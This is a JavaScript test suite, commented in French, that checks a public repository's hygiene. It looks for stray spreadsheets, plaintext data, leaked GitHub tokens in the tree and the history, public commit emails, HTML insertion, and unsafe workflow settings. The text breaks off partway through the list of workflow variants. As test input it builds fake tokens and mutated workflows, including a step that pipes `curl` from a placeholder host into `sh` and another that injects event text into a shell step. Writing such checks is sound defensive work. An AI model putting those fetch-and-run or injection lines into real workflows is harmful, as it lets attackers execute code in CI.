// Contrôles du dépôt (SPECIFICATION.md, § 11, domaine « Dépôt »).
//
// Le dépôt est public : ces contrôles gardent les interdits 1 à 3 (§ 0),
// l'adresse privée des commits (§ 10.3) et l'absence d'insertion de HTML
// (§ 10.1). Chaque vérification est une fonction autonome. Un premier essai
// la nourrit d'une entrée fautive fabriquée ici, qu'elle doit repérer ; un
// second l'applique au vrai dépôt.
//
// Les fichiers examinés sont ceux que Git suit ou suivrait (non ignorés) :
// une faute se voit ainsi avant d'être commitée.

import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createHash } from "node:crypto";
import { tmpdir } from "node:os";
import { delimiter, join } from "node:path";
import { fileURLToPath } from "node:url";
import { CHEMIN_INDEX, FICHIER, ecrireFichier, ecrireIndex, lireFichier, lireIndex, versionDe } from "../js/personnage/en_ligne.js";
import { CLASSEUR_ESSAI } from "./outils/classeur_essai.js";
import { fabriquerClasseur } from "./outils/fabrique_classeur.js";

const RACINE = fileURLToPath(new URL("..", import.meta.url));

function git(...parametres) {
  return gitDans(RACINE, ...parametres);
}

// Un environnement sans les variables GIT_… qu'exporte Git quand il lance un
// crochet (GIT_DIR…) : sinon, depuis le crochet pre-push, un git lancé dans
// un dépôt d'essai écrirait dans le vrai. NODE_TEST_CONTEXT, que ce contrôle
// hérite de node --test, reste : le crochet doit s'en défaire lui-même.
const ENVIRONNEMENT = Object.fromEntries(Object.entries(process.env).filter(([nom]) => !nom.startsWith("GIT_")));

// core.quotePath=false : un chemin accentué (« Système/ ») reste lisible.
function gitDans(dossier, ...parametres) {
  return execFileSync("git", ["-c", "core.quotePath=false", ...parametres], { cwd: dossier, encoding: "utf8", maxBuffer: 64 * 1024 * 1024, env: ENVIRONNEMENT });
}

function cheminsDuDepot() {
  const chemins = git("ls-files", "-z", "--cached", "--others", "--exclude-standard").split("\0").filter(Boolean);
  return [...new Set(chemins)].filter((chemin) => existsSync(join(RACINE, chemin)));
}

// latin1 lit chaque octet tel quel : les binaires passent aussi au crible.
function lire(chemin, codage = "latin1") {
  return readFileSync(join(RACINE, chemin), codage);
}

function lignesFautives(fichiers, motif) {
  const fautes = [];
  for (const { chemin, contenu } of fichiers) {
    contenu.split("\n").forEach((ligne, indice) => {
      if (motif.test(ligne)) fautes.push(`${chemin}, ligne ${indice + 1}`);
    });
  }
  return fautes;
}

// Interdit 1 : aucun classeur hors d'essais/.
function classeursHorsEssais(chemins) {
  return chemins.filter((chemin) => /\.xlsx$/i.test(chemin) && !/^essais\/[^/]+\.xlsx$/i.test(chemin));
}

// Interdit 1 : un classeur d'essais/ est un classeur que l'outil des essais
// fabrique, octet pour octet, depuis une description connue. Un classeur
// réel posé dans essais/, quel que soit son nom, ne passe pas.
const CLASSEURS_D_ESSAI = { "essais/classeur_essai.xlsx": CLASSEUR_ESSAI };

function classeursInconnus(chemins, lireOctets) {
  return chemins
    .filter((chemin) => /\.xlsx$/i.test(chemin) && /^essais\//i.test(chemin))
    .filter((chemin) => !Object.hasOwn(CLASSEURS_D_ESSAI, chemin) || !fabriquerClasseur(CLASSEURS_D_ESSAI[chemin]).equals(lireOctets(chemin)));
}

// Les autres formats d'un classeur ou d'un document (un « Enregistrer
// sous », un export PDF), et tout JSON hors de cette liste, restent hors du
// dépôt : une banque en clair gardée pour déboguer ne passe pas.
const FORMATS_INTERDITS = /\.(?:xls|xlsm|xlsb|ods|csv|doc|docm|odt|pdf)$/i;
const JSON_PERMIS = ["package.json", "essais/banque_demo.chiffree.json", "donnees/banque.chiffree.json", "essais/personnage_demo.arpenteur.json"];
// Retirés depuis, mais permis dans l'historique : le fichier figé du format 1
// (lot 2 bis, § 7.1).
const JSON_DE_L_HISTORIQUE = ["essais/banque_format1.chiffree.json"];

// Les personnages en ligne (§ 15.8) : les fichiers que range l'automate et
// leur index, sous ces seules formes. Le même prédicat sert à l'historique.
const personnagePermis = (chemin) => FICHIER.test(chemin) || chemin === CHEMIN_INDEX;

function fichiersHorsListe(chemins, { historique = false } = {}) {
  const permis = historique ? [...JSON_PERMIS, ...JSON_DE_L_HISTORIQUE] : JSON_PERMIS;
  return chemins.filter((chemin) => FORMATS_INTERDITS.test(chemin) || (/\.json$/i.test(chemin) && !permis.includes(chemin) && !personnagePermis(chemin)));
}

// personnages/, quelle que soit la casse, ne contient rien d'autre.
function personnagesHorsForme(chemins) {
  return chemins.filter((chemin) => chemin.toLowerCase().startsWith("personnages/") && !personnagePermis(chemin));
}

// § 10.1 : GitHub Pages sert chaque fichier du dépôt dans l'origine de
// l'Atelier, sans la politique de sécurité de index.html. La seule page est
// index.html, la seule image SVG l'icône, que dessine son outil.
function pagesEnTrop(chemins) {
  return chemins.filter((chemin) => /\.(?:html?|xhtml|xml|svg)$/i.test(chemin) && !["index.html", "icones/icone.svg"].includes(chemin));
}

// Le Word des règles, comme tout document Word, reste hors du dépôt.
function documentsWord(chemins) {
  return chemins.filter((chemin) => /\.docx$/i.test(chemin));
}

// Interdit 2 : donnees/ ne contient que la banque chiffrée, et celle-ci n'a
// que les champs de l'en-tête du § 7.1. Une liste blanche plutôt qu'une liste
// noire : un champ en clair inattendu ne passe pas.
const BANQUE = "donnees/banque.chiffree.json";
const BASE64 = /^[A-Za-z0-9+/]+={0,2}$/;
const CHAMPS = {
  "": ["format", "publiee_le", "empreinte", "kdf", "chiffre"],
  kdf: ["nom", "iterations", "sel"],
  chiffre: ["nom", "iv", "donnees"],
};

// Les octets d'un texte base64 complet, ou null.
function octetsBase64(texte) {
  if (typeof texte !== "string" || !BASE64.test(texte) || texte.length % 4 !== 0) return null;
  return Buffer.from(texte, "base64");
}

// Des données chiffrées ne se lisent pas comme du texte : une banque en clair
// seulement encodée en base64 se lirait.
function seLitCommeDuTexte(octets) {
  try {
    new TextDecoder("utf-8", { fatal: true }).decode(octets);
    return true;
  } catch {
    return false;
  }
}

function defautDeFormeChiffree(texte) {
  let banque;
  try {
    banque = JSON.parse(texte);
  } catch {
    return "JSON illisible";
  }
  for (const [partie, permis] of Object.entries(CHAMPS)) {
    const objet = partie ? banque?.[partie] : banque;
    if (typeof objet !== "object" || objet === null || Array.isArray(objet)) return `${partie || "la banque"} n'est pas un objet`;
    const enTrop = Object.keys(objet).filter((cle) => !permis.includes(cle));
    if (enTrop.length) return `champs hors du § 7.1 : ${enTrop.join(", ")}`;
  }
  const { kdf, chiffre } = banque;
  if (kdf.nom !== "PBKDF2-SHA256" || kdf.iterations !== 600000 || octetsBase64(kdf.sel)?.length !== 16) {
    return "dérivation (kdf) hors du § 7.1";
  }
  const donnees = octetsBase64(chiffre.donnees);
  if (chiffre.nom !== "AES-GCM" || octetsBase64(chiffre.iv)?.length !== 12 || !donnees || donnees.length < 16) {
    return "données chiffrées incomplètes";
  }
  if (seLitCommeDuTexte(donnees)) return "données en clair, seulement encodées en base64";
  if (banque.format !== 2) return `format ${banque.format} inconnu`;
  // Format 2 : l'empreinte est celle des octets chiffrés, et se vérifie ici.
  if (banque.empreinte !== `sha256:${createHash("sha256").update(donnees).digest("hex")}`) {
    return "format 2 : l'empreinte n'est pas celle des octets chiffrés";
  }
  return null;
}

// La banque publiée est au format 2 depuis le 29/09/2026, et le format 1 ne
// se lit plus (lot 2 bis) : un onglet resté sur un ancien code qui
// l'écrirait se verrait ici.
const defautDeLaBanquePubliee = defautDeFormeChiffree;

function donneesEnClair(chemins, lireTexte) {
  const fautes = [];
  for (const chemin of chemins.filter((c) => c.toLowerCase().startsWith("donnees/"))) {
    const defaut = chemin === BANQUE ? defautDeLaBanquePubliee(lireTexte(chemin)) : `seule ${BANQUE} a sa place ici`;
    if (defaut) fautes.push(`${chemin} : ${defaut}`);
  }
  return fautes;
}

// Interdit 2, pour les personnages en ligne (§ 15.8) : chaque fichier se lit
// par le vérificateur de la page, sous l'identifiant de son chemin, et son
// contenu ne se lit pas comme du texte ; l'index dit exactement les
// fichiers présents, avec leur version. Les formats n'ont que des champs
// comptés, des identifiants, des dates et du base64 : aucun nom n'y tient
// en clair.
function defautsDesPersonnages(chemins, lireTexte) {
  const fautes = personnagesHorsForme(chemins).map((chemin) => `${chemin} : ni un fichier rangé ni l'index`);
  const presents = new Set();
  const lus = new Map();
  for (const chemin of chemins) {
    const trouve = FICHIER.exec(chemin);
    if (!trouve) continue;
    presents.add(trouve[1]);
    const lu = lireFichier(lireTexte(chemin), { identifiant: trouve[1] });
    if (lu.erreur) fautes.push(`${chemin} : ${lu.erreur}`);
    else if (seLitCommeDuTexte(Buffer.from(lu.fichier.contenu, "base64"))) fautes.push(`${chemin} : contenu en clair, seulement encodé en base64`);
    else lus.set(trouve[1], lu.fichier);
  }
  if (!chemins.includes(CHEMIN_INDEX)) {
    if (presents.size) fautes.push(`${CHEMIN_INDEX} manque`);
    return fautes;
  }
  const lu = lireIndex(lireTexte(CHEMIN_INDEX));
  if (lu.erreur) return [...fautes, `${CHEMIN_INDEX} : ${lu.erreur}`];
  const entrees = new Map(lu.index.personnages.map((entree) => [entree.identifiant, entree]));
  for (const identifiant of presents) {
    const entree = entrees.get(identifiant);
    const fichier = lus.get(identifiant);
    if (!entree) fautes.push(`${CHEMIN_INDEX} : ${identifiant} n'y est pas`);
    else if (fichier && (entree.version !== versionDe(fichier) || entree.range_le !== fichier.range_le)) fautes.push(`${CHEMIN_INDEX} : ${identifiant} n'a pas la version de son fichier`);
  }
  for (const identifiant of entrees.keys()) if (!presents.has(identifiant)) fautes.push(`${CHEMIN_INDEX} : ${identifiant} n'a pas de fichier`);
  return fautes;
}

// Interdit 3 : aucun jeton GitHub entier. Un préfixe seul ne suffit pas, car
// la spécification les cite (§ 11). La faute donne le fichier et la ligne,
// jamais le jeton, que le journal de GitHub Actions rendrait public.
const JETON = /(?:gh[pousr]_|github_pat_)[A-Za-z0-9_]{36,}/;

// Sans ses octets nuls, un texte UTF-16 (ce qu'écrit « > » dans Windows
// PowerShell 5.1) se lit comme de l'ASCII : un jeton y reste visible.
function jetonsEntiers(fichiers) {
  return lignesFautives(
    fichiers.map(({ chemin, contenu }) => ({ chemin, contenu: contenu.replaceAll("\0", "") })),
    JETON,
  );
}

// L'historique aussi : un fichier ajouté puis retiré reste public.
function cheminsDeLHistorique(dossier = RACINE) {
  return [...new Set(gitDans(dossier, "log", "--all", "--name-only", "--format=").split("\n").filter(Boolean))];
}

// Les contenus de l'historique qui portent un jeton entier : « blob:chemin »,
// jamais le jeton, que le journal de GitHub Actions rendrait public. Chaque
// contenu (blob) atteint depuis une référence est lu une seule fois, quel
// que soit le nombre de révisions qui le portent : l'automate ajoute un
// commit par ticket rangé, et passer les révisions en arguments dépasserait
// la ligne de commande de Windows (32 767 signes, quelque 790 révisions),
// puis relirait l'arbre entier de chacune. Les contenus se lisent en un seul
// appel, en mémoire (3,6 Mo au 30/09/2026). Comme dans l'arbre
// (jetonsEntiers), les octets nuls d'un texte UTF-16 sont ôtés.
function jetonsDansLHistorique(dossier = RACINE) {
  // Les blobs, chacun avec un chemin où il paraît ; les commits, sans chemin, sont laissés.
  const chemins = new Map();
  for (const ligne of gitDans(dossier, "rev-list", "--all", "--objects", "--filter=object:type=blob").split("\n")) {
    const espace = ligne.indexOf(" ");
    if (espace > 0) chemins.set(ligne.slice(0, espace), ligne.slice(espace + 1));
  }
  if (chemins.size === 0) return [];
  // « sha type taille », puis le contenu et une fin de ligne, pour chacun.
  const sortie = execFileSync("git", ["cat-file", "--batch"], { cwd: dossier, env: ENVIRONNEMENT, input: `${[...chemins.keys()].join("\n")}\n`, maxBuffer: Infinity, stdio: ["pipe", "pipe", "pipe"] });
  const fautes = [];
  for (let position = 0; position < sortie.length; ) {
    const finDEnTete = sortie.indexOf(0x0a, position);
    const [sha, type, taille] = sortie.toString("latin1", position, finDEnTete).split(" ");
    if (type !== "blob") throw new Error(`git cat-file : ${sha} n'est pas un contenu lisible`);
    const debut = finDEnTete + 1;
    if (JETON.test(sortie.toString("latin1", debut, debut + Number(taille)).replaceAll("\0", ""))) fautes.push(`${sha}:${chemins.get(sha)}`);
    position = debut + Number(taille) + 1;
  }
  return fautes;
}

// Tout ce qu'un chemin seul suffit à interdire, pour l'historique.
function cheminsInterdits(chemins) {
  return [
    ...classeursHorsEssais(chemins),
    ...chemins.filter((chemin) => /^essais\/[^/]+\.xlsx$/i.test(chemin) && !Object.hasOwn(CLASSEURS_D_ESSAI, chemin)),
    ...documentsWord(chemins),
    ...fichiersHorsListe(chemins, { historique: true }),
    ...pagesEnTrop(chemins),
    ...chemins.filter((chemin) => chemin.toLowerCase().startsWith("donnees/") && chemin !== BANQUE),
    ...personnagesHorsForme(chemins),
  ];
}

// § 10.2 : deux workflows, et eux seuls. « Contrôles » lance node --test ;
// « Personnages » lance l'automate des personnages en ligne (§ 15.8).
const WORKFLOWS = { controles: ".github/workflows/controles.yml", personnages: ".github/workflows/personnages.yml" };

function workflowsInconnus(chemins) {
  return chemins.filter((chemin) => chemin.toLowerCase().startsWith(".github/workflows/") && !Object.values(WORKFLOWS).includes(chemin));
}

// Les actions d'un workflow : « propriétaire/nom@commit ».
function actionsDe(texte) {
  return [...texte.matchAll(/^\s*(?:-\s*)?uses:\s*(\S+)/gm)].map(([, action]) => action);
}

// Ce que tout workflow respecte : des actions fixées sur un commit, avec leur
// version ; contents: read au niveau du workflow ; aucun jeton gardé ; aucun
// texte venu d'un tiers.
function defautsCommuns(texte) {
  const fautes = [];
  for (const [, action, suite] of texte.matchAll(/^\s*(?:-\s*)?uses:\s*(\S+)(.*)$/gm)) {
    if (!/^[\w.-]+\/[\w.-]+@[0-9a-f]{40}$/.test(action) || !/^\s+#\s*v\d/.test(suite)) fautes.push(`action non fixée : ${action}`);
  }
  if (!/^permissions:[ ]*\r?\n[ ]+contents:[ ]*read[ ]*\r?$/m.test(texte)) fautes.push("permissions : contents: read attendu au niveau du workflow");
  if (!/persist-credentials:\s*false/.test(texte)) fautes.push("persist-credentials: false attendu");
  if (/pull_request_target|workflow_run/.test(texte)) fautes.push("déclencheur qui donne des droits à un tiers");
  if (/\$\{\{\s*github\.event/.test(texte)) fautes.push("texte d'un événement recopié dans le workflow");
  return fautes;
}

// « Contrôles » : les règles communes, et aucune écriture.
function defautsDuWorkflow(texte) {
  const fautes = defautsCommuns(texte);
  if (/:\s*write\b/.test(texte)) fautes.push("une permission en écriture");
  return fautes;
}

// Les lignes utiles d'un YAML (ni vides ni commentaires, sans commentaire
// de fin), puis les blocs d'une clé : les lignes plus indentées qui la suivent.
function lignesUtiles(texte) {
  return texte
    .split(/\r?\n/)
    .filter((ligne) => ligne.trim() !== "" && !/^\s*#/.test(ligne))
    .map((ligne) => ligne.replace(/\s+#.*$/, "").trimEnd());
}

const LANCER_L_AUTOMATE = "node outils/automate_personnages.js";

// « Personnages » : les règles communes, et son texte exact, ligne utile par
// ligne utile (ni les lignes vides ni les commentaires ne comptent). Une
// liste de règles laissait passer ce qu'elle ne nommait pas : un
// interpréteur (shell:), NODE_OPTIONS, un conteneur, une autre machine, un
// second checkout qui garde le jeton… Le texte exact ne laisse rien passer.
// Ouverture d'un ticket ou lancement à la main ; contents: read au
// workflow ; un passage à la fois, jamais interrompu ; un seul job, qui seul
// écrit (contents, issues, pages) ; les actions de « Contrôles », sur les
// mêmes commits ; une seule commande, l'automate ; le jeton pour seule
// expression. Aucune ligne n'a de guillemet ni d'indicateur de bloc (| >) :
// un commentaire ne peut s'y cacher dans une valeur.
function gabaritDeLAutomate(checkout, setupNode) {
  return [
    "name: Personnages",
    "on:",
    "  issues:",
    "    types: [opened]",
    "  workflow_dispatch:",
    "permissions:",
    "  contents: read",
    "concurrency:",
    "  group: personnages",
    "  cancel-in-progress: false",
    "jobs:",
    "  ranger:",
    "    name: Ranger les personnages",
    "    runs-on: ubuntu-latest",
    "    timeout-minutes: 5",
    "    permissions:",
    "      contents: write",
    "      issues: write",
    "      pages: write",
    "    steps:",
    "      - name: Récupérer le dépôt",
    `        uses: ${checkout}`,
    "        with:",
    "          persist-credentials: false",
    "      - name: Installer Node 24",
    `        uses: ${setupNode}`,
    "        with:",
    "          node-version: 24",
    "      - name: Ranger les tickets ouverts",
    `        run: ${LANCER_L_AUTOMATE}`,
    "        env:",
    "          JETON: ${{ github.token }}",
  ];
}

// La faute donne le numéro de la ligne utile et ce qui était attendu, jamais
// la ligne trouvée : le journal de GitHub Actions est public.
function defautsDeLAutomate(texte, controles) {
  const fautes = defautsCommuns(texte);
  const actions = actionsDe(controles);
  const checkout = actions.find((action) => action.startsWith("actions/checkout@"));
  const setupNode = actions.find((action) => action.startsWith("actions/setup-node@"));
  if (!checkout || !setupNode) return [...fautes, "« Contrôles » n'emploie pas actions/checkout et actions/setup-node"];
  const attendu = gabaritDeLAutomate(checkout, setupNode);
  const lignes = lignesUtiles(texte);
  const ecart = attendu.findIndex((ligne, i) => lignes[i] !== ligne);
  if (ecart !== -1) fautes.push(`ligne utile ${ecart + 1} : « ${attendu[ecart].trim()} » attendu`);
  else if (lignes.length > attendu.length) fautes.push(`${lignes.length - attendu.length} ligne(s) utile(s) de trop après la ${attendu.length}ᵉ`);
  return fautes;
}

// § 10.3 : l'historique public ne porte que des adresses privées GitHub. Les
// commits faits sur le site de GitHub ont pour committer noreply@github.com ;
// la ligne « Co-Authored-By » d'un message n'est pas une adresse d'auteur.
const ADRESSE_PRIVEE = /^[^@\s]+@users\.noreply\.github\.com$/i;

function adressesPubliques(commits) {
  const fautes = [];
  for (const { sha, auteur, committer } of commits) {
    if (!ADRESSE_PRIVEE.test(auteur)) fautes.push(`${sha.slice(0, 7)} : auteur <${auteur}>`);
    if (!ADRESSE_PRIVEE.test(committer) && committer !== "noreply@github.com") {
      fautes.push(`${sha.slice(0, 7)} : committer <${committer}>`);
    }
  }
  return fautes;
}

function commitsDuDepot() {
  return git("log", "--all", "--format=%H%x09%ae%x09%ce")
    .split("\n")
    .filter(Boolean)
    .map((ligne) => {
      const [sha, auteur, committer] = ligne.split("\t");
      return { sha, auteur, committer };
    });
}

// § 10.1 : aucune donnée insérée comme HTML. Le mot est proscrit des fichiers
// du site (la page, ses styles, ses modules, son manifeste) et des outils,
// commentaires compris : le contrôle ne distingue pas un commentaire.
const FICHIER_DU_SITE = /^(?:index\.html|manifest\.webmanifest|(?:css|js|outils)\/.+)$/;
const INSERTION_HTML = /\b(?:innerHTML|outerHTML|insertAdjacentHTML)\b|\bdocument\s*\.\s*write(?:ln)?\b/;

function insertionsHtml(fichiers) {
  return lignesFautives(fichiers, INSERTION_HTML);
}

test("interdit 1 — repère un classeur hors d'essais/", () => {
  const chemins = ["essais/classeur_essai.xlsx", "regles_jdr.xlsx", "essais/vieux/copie.XLSX", "js/lecture/xlsx.js"];
  assert.deepEqual(classeursHorsEssais(chemins), ["regles_jdr.xlsx", "essais/vieux/copie.XLSX"]);
});

test("interdit 1 — aucun classeur hors d'essais/ dans le dépôt", () => {
  assert.deepEqual(classeursHorsEssais(cheminsDuDepot()), []);
});

test("Word — repère un document Word", () => {
  const chemins = ["Principe jdr abrasia.docx", "essais/notes.DOCX", "SPECIFICATION.md"];
  assert.deepEqual(documentsWord(chemins), ["Principe jdr abrasia.docx", "essais/notes.DOCX"]);
});

test("Word — aucun document Word dans le dépôt", () => {
  assert.deepEqual(documentsWord(cheminsDuDepot()), []);
});

test("interdit 1 — repère un classeur d'essais/ qui n'est pas fabriqué par l'outil des essais", () => {
  const vrai = readFileSync(join(RACINE, "essais/classeur_essai.xlsx"));
  const octets = { "essais/classeur_essai.xlsx": vrai, "essais/regles_jdr.xlsx": vrai, "essais/Classeur_Essai.XLSX": vrai };
  assert.deepEqual(classeursInconnus(Object.keys(octets), (c) => octets[c]), ["essais/regles_jdr.xlsx", "essais/Classeur_Essai.XLSX"]);
  assert.deepEqual(classeursInconnus(["essais/classeur_essai.xlsx"], () => Buffer.from("un autre classeur")), ["essais/classeur_essai.xlsx"]);
});

test("interdit 1 — chaque classeur d'essais/ est fabriqué par l'outil des essais", () => {
  assert.deepEqual(classeursInconnus(cheminsDuDepot(), (chemin) => readFileSync(join(RACINE, chemin))), []);
});

test(".gitignore — ignore les classeurs, documents et données en clair, pas les fichiers du site", () => {
  const ignores = [
    "regles_jdr.xlsx", "essais/regles_jdr.xlsx", "essais/sous/copie.xlsx", "Système/regles_jdr.xlsx", "système/x.xlsx",
    "regles.xlsm", "regles.xls", "regles.xlsb", "regles.ods", "regles.csv",
    "Principe jdr abrasia.docx", "principe.doc", "principe.docm", "principe.odt", "principe.pdf",
    "donnees/banque.json", "donnees/sous/clair.json", "banque.json", "essais/banque_claire.json", "tests/banque.json",
    "plans/instruction.md", "ressources/notes.md", "desktop.ini", "Thumbs.db", "~$regles_jdr.xlsx", "essais/~$classeur_essai.xlsx",
    "Aubépine.arpenteur.json", "essais/Mon personnage.arpenteur.json", "essais/personnage_demo.json",
    "personnages/clair.json", "personnages/sous/Qx7-aZ_09bcdEFGHijklmn.chiffre.json", "personnages/sous/index.json", "index.json",
    "personnages/notes.txt", "personnages/sous/notes.txt", "personnages/Qx7-aZ_09bcdEFGHijklmn.chiffre.js",
  ];
  const suivis = [
    "essais/classeur_essai.xlsx", "essais/banque_demo.chiffree.json", "donnees/banque.chiffree.json", "package.json", "index.html", "js/application.js", "icones/icone.svg",
    "essais/personnage_demo.arpenteur.json", "polices/Marcellus-Regular.woff2", "polices/OFL-Marcellus.txt", "css/fiche.css",
    "personnages/Qx7-aZ_09bcdEFGHijklmn.chiffre.json", "personnages/index.json",
  ];
  let sortie = "";
  try {
    sortie = git("check-ignore", "--no-index", "--", ...ignores, ...suivis);
  } catch (erreur) {
    if (erreur.status !== 1) throw erreur;
  }
  const vus = sortie.split("\n").filter(Boolean);
  assert.deepEqual(ignores.filter((chemin) => !vus.includes(chemin)), [], "à ignorer");
  assert.deepEqual(suivis.filter((chemin) => vus.includes(chemin)), [], "à suivre");
});

test("formats — repère un autre format de classeur ou de document, un JSON hors liste, une page en trop", () => {
  const chemins = ["regles.xlsm", "regles.CSV", "principe.pdf", "Principe.doc", "tests/banque.json", "package.json", "essais/banque_demo.chiffree.json", "js/lecture/xlsx.js"];
  assert.deepEqual(fichiersHorsListe(chemins), chemins.slice(0, 5));
  const pages = ["index.html", "icones/icone.svg", "guide.html", "docs/schema.svg", "a.xhtml", "b.XML", "c.htm", "SPECIFICATION.md"];
  assert.deepEqual(pagesEnTrop(pages), pages.slice(2, 7));
});

test("formats — aucun autre format de classeur ou de document, aucun JSON hors liste, aucune page en trop", () => {
  assert.deepEqual(fichiersHorsListe(cheminsDuDepot()), []);
  assert.deepEqual(pagesEnTrop(cheminsDuDepot()), []);
});

test("historique — repère un classeur ou un jeton ajouté puis retiré", () => {
  const essai = mkdtempSync(join(tmpdir(), "atelier-historique-"));
  try {
    const g = (...parametres) => gitDans(essai, "-c", "user.name=Essai", "-c", "user.email=essai@users.noreply.github.com", "-c", "commit.gpgsign=false", ...parametres);
    g("init", "-q");
    writeFileSync(join(essai, "regles_jdr.xlsx"), "un faux classeur");
    writeFileSync(join(essai, "note.txt"), `jeton : ${"ghp_" + "A1b2".repeat(9)}`);
    // En UTF-16, comme dans l'arbre (jetonsEntiers) : les octets nuls ôtés.
    writeFileSync(join(essai, "note16.txt"), Buffer.from(`﻿jeton : ${"ghp_" + "C3d4".repeat(9)}\r\n`, "utf16le"));
    writeFileSync(join(essai, "propre.txt"), "rien");
    g("add", "-A");
    g("commit", "-q", "-m", "ajout");
    g("rm", "-q", "regles_jdr.xlsx", "note.txt", "note16.txt");
    g("commit", "-q", "-m", "retrait");
    assert.deepEqual(cheminsInterdits(cheminsDeLHistorique(essai)), ["regles_jdr.xlsx"]);
    const trouves = jetonsDansLHistorique(essai).sort();
    assert.equal(trouves.length, 2);
    assert.match(trouves[0], /^[0-9a-f]{40}:note\.txt$/);
    assert.match(trouves[1], /^[0-9a-f]{40}:note16\.txt$/);
  } finally {
    rmSync(essai, { recursive: true, force: true });
  }
});

test("historique — un historique de 900 révisions se lit en entier (la ligne de commande de Windows en passerait quelque 790)", () => {
  const essai = mkdtempSync(join(tmpdir(), "atelier-historique-long-"));
  try {
    gitDans(essai, "init", "-q", "--initial-branch=main");
    // 900 commits d'un seul coup (git fast-import) : un jeton ajouté au
    // premier, retiré au second ; l'automate en ajoute un par ticket rangé.
    const donnee = (texte) => `data ${Buffer.byteLength(texte)}\n${texte}\n`;
    let flux = "";
    for (let n = 1; n <= 900; n++) {
      flux += `commit refs/heads/main\ncommitter Essai <essai@users.noreply.github.com> ${1790000000 + n} +0000\n${donnee(`commit ${n}`)}`;
      flux += `M 100644 inline compteur.txt\n${donnee(`${n}\n`)}`;
      if (n === 1) flux += `M 100644 inline note.txt\n${donnee(`jeton : ${"ghp_" + "A1b2".repeat(9)}\n`)}`;
      if (n === 2) flux += "D note.txt\n";
      flux += "\n";
    }
    execFileSync("git", ["fast-import", "--quiet"], { cwd: essai, env: ENVIRONNEMENT, input: flux, stdio: ["pipe", "pipe", "pipe"] });
    assert.equal(gitDans(essai, "rev-list", "--count", "--all").trim(), "900");
    const trouves = jetonsDansLHistorique(essai);
    assert.equal(trouves.length, 1);
    assert.match(trouves[0], /^[0-9a-f]{40}:note\.txt$/);
  } finally {
    rmSync(essai, { recursive: true, force: true });
  }
});

test("historique — aucun fichier interdit, aucun jeton, dans tout l'historique", () => {
  const chemins = cheminsDeLHistorique();
  assert.ok(chemins.includes("SPECIFICATION.md"), "historique vide : le contrôle ne prouverait rien");
  assert.deepEqual(cheminsInterdits(chemins), []);
  assert.deepEqual(jetonsDansLHistorique(), []);
});

test("workflow — repère une action non fixée, des droits en écriture, un déclencheur dangereux", () => {
  const vrai = readFileSync(join(RACINE, ".github/workflows/controles.yml"), "utf8");
  assert.deepEqual(defautsDuWorkflow(vrai), []);
  const variantes = {
    "action non fixée": vrai.replace(/actions\/checkout@[0-9a-f]{40}/, "actions/checkout@v7"),
    "sans version": vrai.replace("# v7.0.1", ""),
    "écriture": vrai.replace("contents: read", "contents: write"),
    "écriture en plus": vrai.replace("  contents: read", "  contents: read\n  pull-requests: write"),
    "sans permissions": vrai.replace(/permissions:[ ]*\r?\n[ ]+contents: read\r?\n/, ""),
    "jeton gardé": vrai.replace("persist-credentials: false", "persist-credentials: true"),
    "tiers": vrai.replace("  pull_request:", "  pull_request_target:"),
    "injection": vrai.replace("run: node --test", "run: echo \"${{ github.event.head_commit.message }}\" && node --test"),
  };
  for (const [cas, variante] of Object.entries(variantes)) {
    assert.notEqual(variante, vrai, `${cas} : la variante n'a rien changé`);
    assert.notDeepEqual(defautsDuWorkflow(variante), [], cas);
  }
});

test("workflow — repère, dans l'automate des personnages, un déclencheur, un droit, une action, une commande ou une expression de trop", () => {
  const controles = readFileSync(join(RACINE, WORKFLOWS.controles), "utf8");
  const vrai = readFileSync(join(RACINE, WORKFLOWS.personnages), "utf8").replace(/\r\n/g, "\n");
  assert.deepEqual(defautsDeLAutomate(vrai, controles), []);
  // Les règles de « Contrôles » refusent ses écritures : chacun les siennes.
  assert.notDeepEqual(defautsDuWorkflow(vrai), []);
  assert.notDeepEqual(defautsDeLAutomate(controles, controles), []);
  const variantes = {
    "déclencheur en plus": vrai.replace("  workflow_dispatch:\n", "  workflow_dispatch:\n  push:\n"),
    "type en plus": vrai.replace("types: [opened]", "types: [opened, edited]"),
    "tiers": vrai.replace("  workflow_dispatch:\n", "  workflow_dispatch:\n  workflow_run:\n    workflows: [Contrôles]\n"),
    "écriture au workflow": vrai.replace("permissions:\n  contents: read", "permissions:\n  contents: write"),
    "sans permissions au workflow": vrai.replace("permissions:\n  contents: read\n", ""),
    "écriture en plus au job": vrai.replace("      pages: write\n", "      pages: write\n      actions: write\n"),
    "tout en écriture": vrai.replace(/    permissions:\n(?:      \w+: write\n)+/, "    permissions: write-all\n"),
    "sans permissions au job": vrai.replace(/    permissions:\n(?:      \w+: write\n)+/, ""),
    "action non fixée": vrai.replace(/actions\/checkout@[0-9a-f]{40}/, "actions/checkout@v7"),
    "action d'un autre commit": vrai.replace(/actions\/checkout@[0-9a-f]{40}/, `actions/checkout@${"0".repeat(40)}`),
    "action en plus": vrai.replace("      - name: Ranger", `      - uses: tiers/action@${"1".repeat(40)} # v1\n      - name: Ranger`),
    "sans version": vrai.replace("# v7.0.1", ""),
    "jeton gardé": vrai.replace("persist-credentials: false", "persist-credentials: true"),
    "injection": vrai.replace("          JETON: ${{ github.token }}", "          JETON: ${{ github.token }}\n          TITRE: ${{ github.event.issue.title }}"),
    "autre secret": vrai.replace("${{ github.token }}", "${{ secrets.AUTRE }}"),
    "commande en plus": vrai.replace("      - name: Ranger", "      - run: npm install\n      - name: Ranger"),
    "commande changée": vrai.replace(`run: ${LANCER_L_AUTOMATE}`, `run: ${LANCER_L_AUTOMATE} && echo fini`),
    "annulation": vrai.replace("cancel-in-progress: false", "cancel-in-progress: true"),
    "autre groupe": vrai.replace("group: personnages", "group: autre"),
    "sans concurrence": vrai.replace(/concurrency:\n  group: personnages\n  cancel-in-progress: false\n/, ""),
    "second job": `${vrai}  autre:\n    runs-on: ubuntu-latest\n    steps:\n      - run: node outils/automate_personnages.js\n`,
    // Ce qu'une liste de règles laissait passer : du code arbitraire, un
    // autre lieu d'exécution, un jeton gardé par un second checkout.
    "interpréteur": vrai.replace("        run: node outils", "        shell: bash -c 'curl -s https://exemple.invalid | sh; node {0}'\n        run: node outils"),
    "NODE_OPTIONS": vrai.replace("          JETON: ${{ github.token }}", "          JETON: ${{ github.token }}\n          NODE_OPTIONS: --import=./x.mjs"),
